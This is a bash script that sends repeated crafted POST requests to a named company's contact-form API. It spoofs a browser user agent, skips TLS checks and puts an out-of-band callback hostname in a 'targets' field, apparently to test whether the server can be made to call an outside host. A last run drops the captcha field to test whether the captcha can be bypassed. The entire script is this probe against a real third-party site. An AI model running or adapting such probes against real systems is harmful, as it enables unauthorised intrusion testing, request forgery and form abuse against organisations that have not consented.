#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122 Safari/537.36"
B="https://www.infinitycapital.bh/api/send"
H1="oobead15df4c33e.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
for i in 1 2 3; do
echo "### RUN $i"
curl -sk -A "$UA" -m 40 -X POST "$B" \
  --data-urlencode "fname=Verification" --data-urlencode "lname=Run$i" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=IC Assessment" --data-urlencode "subject=Relay verification RUN$i" \
  --data-urlencode "msg=ICMARKER-RUN$i-probe" --data-urlencode "check=on" --data-urlencode "targets=$H1" \
  -w "\nHTTP %{http_code}\n"
done
echo "### RUN nocaptcha"
curl -sk -A "$UA" -m 40 -X POST "$B" \
  --data-urlencode "fname=NoCaptcha" --data-urlencode "lname=R" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=S" \
  --data-urlencode "msg=ICMARKER-NOCAPTCHA" --data-urlencode "targets=$H1" -w "\nHTTP %{http_code}\n"
echo DONE
